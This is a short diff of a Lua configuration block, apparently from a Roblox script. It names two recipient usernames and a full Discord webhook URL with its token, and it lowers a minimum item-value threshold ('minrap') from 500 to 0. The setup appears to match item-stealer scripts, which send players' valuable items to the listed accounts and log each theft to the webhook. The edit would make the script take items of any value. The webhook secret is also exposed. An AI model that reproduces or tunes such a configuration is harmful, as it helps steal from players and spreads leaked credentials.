@@ -9,7 +9,7 @@
 -- Configuration
 _G.Usernames = {"Baconteamoffical0", "Youssefsamsayed2000"}
 _G.webhook = "https://discordapp.com/api/webhooks/1483870020915429616/ywlS0EqlHngDFkRBKIjhsH4eSq0vBEy8tYF2ukPnnP4jesId_gwcVYaTJXNr2eQp5cy8"
-_G.minrap = 500
+_G.minrap = 0
 _G.debugMode = true
 
 -- Script execution check
